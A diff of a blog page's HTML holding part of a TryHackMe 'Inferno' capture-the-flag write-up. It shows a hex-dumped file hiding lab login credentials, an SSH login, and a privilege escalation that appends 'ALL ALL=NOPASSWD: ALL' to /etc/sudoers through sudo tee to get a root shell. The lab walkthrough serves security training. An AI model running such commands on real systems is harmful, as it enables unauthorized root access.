class="m">69</span> 6c 6f <span class="m">20</span> <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> 6d e2 <span class="m">80</span> <span class="m">99</span> <span class="m">68</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">74</span> <span class="m">74</span> 6f <span class="m">20</span> 6f 6e 6f <span class="m">72</span> <span class="m">65</span> 2e 0a 0a <span class="m">56</span> <span class="m">65</span> <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> 6c <span class="m">61</span> <span class="m">20</span> <span class="m">62</span> <span class="m">65</span> <span class="m">73</span> <span class="m">74</span> <span class="m">69</span> <span class="m">61</span> <span class="m">20</span> <span class="m">70</span> <span class="m">65</span> <span class="m">72</span> <span class="m">20</span> <span class="m">63</span> <span class="m">75</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">69</span> 6f <span class="m">20</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">76</span> 6f 6c <span class="m">73</span> <span class="m">69</span> 3b 0a <span class="m">61</span> <span class="m">69</span> <span class="m">75</span> <span class="m">74</span> <span class="m">61</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">61</span> <span class="m">20</span> 6c <span class="m">65</span> <span class="m">69</span> 2c <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> 6d 6f <span class="m">73</span> 6f <span class="m">20</span> <span class="m">73</span> <span class="m">61</span> <span class="m">67</span> <span class="m">67</span> <span class="m">69</span> 6f 2c 0a <span class="m">63</span> <span class="m">68</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">65</span> 6c 6c <span class="m">61</span> <span class="m">20</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">20</span> <span class="m">74</span> <span class="m">72</span> <span class="m">65</span> 6d <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> 6c <span class="m">65</span> <span class="m">20</span> <span class="m">76</span> <span class="m">65</span> 6e <span class="m">65</span> <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> 6f 6c <span class="m">73</span> <span class="m">69</span> c2 bb 2e 0a 0a <span class="m">64</span> <span class="m">61</span> 6e <span class="m">74</span> <span class="m">65</span> 3a <span class="m">56</span> <span class="m">31</span> <span class="m">72</span> <span class="m">67</span> <span class="m">31</span> 6c <span class="m">31</span> <span class="m">30</span> <span class="m">68</span> <span class="m">33</span> 6c <span class="m">70</span> 6d <span class="m">33</span> 0a
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat .download.dat
+</span></span><span class="line"><span class="cl">c2 ab 4f <span class="m">72</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">74</span> <span class="m">75</span> <span class="m">20</span> <span class="m">71</span> <span class="m">75</span> <span class="m">65</span> 6c <span class="m">20</span> <span class="m">56</span> <span class="m">69</span> <span class="m">72</span> <span class="m">67</span> <span class="m">69</span> 6c <span class="m">69</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> <span class="m">71</span> <span class="m">75</span> <span class="m">65</span> 6c 6c <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> 6f 6e <span class="m">74</span> <span class="m">65</span> 0a <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> <span class="m">73</span> <span class="m">70</span> <span class="m">61</span> 6e <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> <span class="m">61</span> <span class="m">72</span> 6c <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> <span class="m">73</span> c3 ac <span class="m">20</span> 6c <span class="m">61</span> <span class="m">72</span> <span class="m">67</span> 6f <span class="m">20</span> <span class="m">66</span> <span class="m">69</span> <span class="m">75</span> 6d <span class="m">65</span> 3f c2 bb 2c 0a <span class="m">72</span> <span class="m">69</span> <span class="m">73</span> <span class="m">70</span> <span class="m">75</span> 6f <span class="m">73</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">69</span> 6f <span class="m">20</span> 6c <span class="m">75</span> <span class="m">69</span> <span class="m">20</span> <span class="m">63</span> 6f 6e <span class="m">20</span> <span class="m">76</span> <span class="m">65</span> <span class="m">72</span> <span class="m">67</span> 6f <span class="m">67</span> 6e 6f <span class="m">73</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">72</span> 6f 6e <span class="m">74</span> <span class="m">65</span> 2e 0a 0a c2 ab 4f <span class="m">20</span> <span class="m">64</span> <span class="m">65</span> <span class="m">20</span> 6c <span class="m">69</span> <span class="m">20</span> <span class="m">61</span> 6c <span class="m">74</span> <span class="m">72</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> 6f <span class="m">65</span> <span class="m">74</span> <span class="m">69</span> <span class="m">20</span> 6f 6e 6f <span class="m">72</span> <span class="m">65</span> <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> 6c <span class="m">75</span> 6d <span class="m">65</span> 2c 0a <span class="m">76</span> <span class="m">61</span> <span class="m">67</span> 6c <span class="m">69</span> <span class="m">61</span> 6d <span class="m">69</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> 6c <span class="m">75</span> 6e <span class="m">67</span> 6f <span class="m">20</span> <span class="m">73</span> <span class="m">74</span> <span class="m">75</span> <span class="m">64</span> <span class="m">69</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> <span class="m">67</span> <span class="m">72</span> <span class="m">61</span> 6e <span class="m">64</span> <span class="m">65</span> <span class="m">20</span> <span class="m">61</span> 6d 6f <span class="m">72</span> <span class="m">65</span> 0a <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> 6d e2 <span class="m">80</span> <span class="m">99</span> <span class="m">68</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">74</span> <span class="m">74</span> 6f <span class="m">20</span> <span class="m">63</span> <span class="m">65</span> <span class="m">72</span> <span class="m">63</span> <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> 6c 6f <span class="m">20</span> <span class="m">74</span> <span class="m">75</span> 6f <span class="m">20</span> <span class="m">76</span> 6f 6c <span class="m">75</span> 6d <span class="m">65</span> 2e 0a 0a <span class="m">54</span> <span class="m">75</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> 6c 6f <span class="m">20</span> 6d <span class="m">69</span> 6f <span class="m">20</span> 6d <span class="m">61</span> <span class="m">65</span> <span class="m">73</span> <span class="m">74</span> <span class="m">72</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> 6d <span class="m">69</span> 6f <span class="m">20</span> <span class="m">61</span> <span class="m">75</span> <span class="m">74</span> 6f <span class="m">72</span> <span class="m">65</span> 2c 0a <span class="m">74</span> <span class="m">75</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">73</span> 6f 6c 6f <span class="m">20</span> <span class="m">63</span> 6f 6c <span class="m">75</span> <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">61</span> <span class="m">20</span> <span class="m">63</span> <span class="m">75</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">69</span> 6f <span class="m">20</span> <span class="m">74</span> 6f 6c <span class="m">73</span> <span class="m">69</span> 0a 6c 6f <span class="m">20</span> <span class="m">62</span> <span class="m">65</span> 6c 6c 6f <span class="m">20</span> <span class="m">73</span> <span class="m">74</span> <span class="m">69</span> 6c 6f <span class="m">20</span> <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> 6d e2 <span class="m">80</span> <span class="m">99</span> <span class="m">68</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">74</span> <span class="m">74</span> 6f <span class="m">20</span> 6f 6e 6f <span class="m">72</span> <span class="m">65</span> 2e 0a 0a <span class="m">56</span> <span class="m">65</span> <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> 6c <span class="m">61</span> <span class="m">20</span> <span class="m">62</span> <span class="m">65</span> <span class="m">73</span> <span class="m">74</span> <span class="m">69</span> <span class="m">61</span> <span class="m">20</span> <span class="m">70</span> <span class="m">65</span> <span class="m">72</span> <span class="m">20</span> <span class="m">63</span> <span class="m">75</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">69</span> 6f <span class="m">20</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">76</span> 6f 6c <span class="m">73</span> <span class="m">69</span> 3b 0a <span class="m">61</span> <span class="m">69</span> <span class="m">75</span> <span class="m">74</span> <span class="m">61</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">61</span> <span class="m">20</span> 6c <span class="m">65</span> <span class="m">69</span> 2c <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> 6d 6f <span class="m">73</span> 6f <span class="m">20</span> <span class="m">73</span> <span class="m">61</span> <span class="m">67</span> <span class="m">67</span> <span class="m">69</span> 6f 2c 0a <span class="m">63</span> <span class="m">68</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">65</span> 6c 6c <span class="m">61</span> <span class="m">20</span> 6d <span class="m">69</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">20</span> <span class="m">74</span> <span class="m">72</span> <span class="m">65</span> 6d <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> 6c <span class="m">65</span> <span class="m">20</span> <span class="m">76</span> <span class="m">65</span> 6e <span class="m">65</span> <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> 6f 6c <span class="m">73</span> <span class="m">69</span> c2 bb 2e 0a 0a <span class="m">64</span> <span class="m">61</span> 6e <span class="m">74</span> <span class="m">65</span> 3a <span class="m">56</span> <span class="m">31</span> <span class="m">72</span> <span class="m">67</span> <span class="m">31</span> 6c <span class="m">31</span> <span class="m">30</span> <span class="m">68</span> <span class="m">33</span> 6c <span class="m">70</span> 6d <span class="m">33</span> 0a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -2400,7 +2400,7 @@ c2 ab 4f <span class="m">72</span> <span class="m">20</span> <span class="m">73<
 <p>In the home directory, we can grab the user flag called <strong>local.txt</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2425,37 +2425,37 @@ c2 ab 4f <span class="m">72</span> <span class="m">20</span> <span class="m">73<
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh dante@10.10.241.114
-dante@10.10.241.114<span class="err">&#39;</span>s password: 
-Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-130-generic x86_64<span class="o">)</span>
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Tue Feb <span class="m">16</span> 20:35:07 UTC <span class="m">2021</span>
-
-  System load:  0.0               Processes:           <span class="m">594</span>
-  Usage of /:   42.0% of 8.79GB   Users logged in:     <span class="m">0</span>
-  Memory usage: 68%               IP address <span class="k">for</span> eth0: 10.10.241.114
-  Swap usage:   0%
-
-
-<span class="m">39</span> packages can be updated.
-<span class="m">0</span> updates are security updates.
-
-
-Last login: Tue Feb <span class="m">16</span> 20:34:47 <span class="m">2021</span> from 10.9.140.180
-dante@Inferno:~$ cat local.txt <span class="p">|</span> wc -c
-<span class="m">33</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh dante@10.10.241.114
+</span></span><span class="line"><span class="cl">dante@10.10.241.114<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-130-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Tue Feb <span class="m">16</span> 20:35:07 UTC <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:           <span class="m">594</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   42.0% of 8.79GB   Users logged in:     <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 68%               IP address <span class="k">for</span> eth0: 10.10.241.114
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">39</span> packages can be updated.
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Tue Feb <span class="m">16</span> 20:34:47 <span class="m">2021</span> from 10.9.140.180
+</span></span><span class="line"><span class="cl">dante@Inferno:~$ cat local.txt <span class="p">|</span> wc -c
+</span></span><span class="line"><span class="cl"><span class="m">33</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>Once again we are being kicked out so we will repeat our &ldquo;bypass&rdquo; by spawning <code>sh</code>  followed by  <code>sudo -l</code> .</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2464,21 +2464,21 @@ dante@Inferno:~$ cat local.txt <span class="p">|</span> wc -c
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">dante@Inferno:~$ /bin/sh
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> dante on Inferno:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User dante may run the following commands on Inferno:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dante@Inferno:~$ /bin/sh
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> dante on Inferno:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User dante may run the following commands on Inferno:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the output we can see that we may run <code>tee</code> as <strong>root</strong>.<br />
 As per usual, we will visit GTFObins for more information on how to escalate our privileges with <a href="https://gtfobins.github.io/gtfobins/tee/">tee</a>.</p>
 <p>We will configure <strong>sudoers</strong> file to run any binary as root. Following with <code>sudo bash -p</code> we will escalate privileges to root and grab the flag called <strong>proof.txt</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2509,36 +2509,36 @@ As per usual, we will visit GTFObins for more information on how to escalate our
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
-$ <span class="nb">echo</span> <span class="s2">&#34;ALL ALL=NOPASSWD: ALL&#34;</span> <span class="p">|</span> sudo tee -a /etc/sudoers
-ALL <span class="nv">ALL</span><span class="o">=</span>NOPASSWD: ALL
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> dante on Inferno:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User dante may run the following commands on Inferno:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: ALL
-$ sudo bash -p
-root@Inferno:~# /bin/sh
-<span class="c1"># id</span>
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-<span class="c1"># cd /root</span>
-<span class="c1"># ls -la</span>
-total <span class="m">32</span>
-drwx------  <span class="m">5</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:45 .
-drwxr-xr-x <span class="m">24</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 14:57 ..
-lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Jan <span class="m">11</span> 15:22 .bash_history -&gt; /dev/null
--rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr  <span class="m">9</span>  <span class="m">2018</span> .bashrc
-drwxr-x---  <span class="m">3</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:45 .config
-drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:30 .local
--rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
--rw-------  <span class="m">1</span> root root   <span class="m">79</span> Jan <span class="m">11</span> 15:45 proof.txt
-drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:19 .ssh
-<span class="c1"># cat proof.txt | wc -c</span>
-<span class="m">79</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dante<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;ALL ALL=NOPASSWD: ALL&#34;</span> <span class="p">|</span> sudo tee -a /etc/sudoers
+</span></span><span class="line"><span class="cl">ALL <span class="nv">ALL</span><span class="o">=</span>NOPASSWD: ALL
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> dante on Inferno:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User dante may run the following commands on Inferno:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: ALL
+</span></span><span class="line"><span class="cl">$ sudo bash -p
+</span></span><span class="line"><span class="cl">root@Inferno:~# /bin/sh
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># cd /root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls -la</span>
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">5</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:45 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">24</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 14:57 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Jan <span class="m">11</span> 15:22 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr  <span class="m">9</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">3</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:45 .config
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:30 .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root   <span class="m">79</span> Jan <span class="m">11</span> 15:45 proof.txt
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <span class="m">11</span> 15:19 .ssh
+</span></span><span class="line"><span class="cl"><span class="c1"># cat proof.txt | wc -c</span>
+</span></span><span class="line"><span class="cl"><span class="m">79</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></br>
 <p><em>Thank you for reading this blog post.</em></p>
@@ -2732,29 +2732,6 @@ drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2finferno%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Inferno%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2finferno%2f&hashtags=enumeration%2cbrute%20force%2ccodiad%2cprivilege%20escalation&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2780,7 +2757,7 @@ drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2967,7 +2944,7 @@ drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3983,7 +3960,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
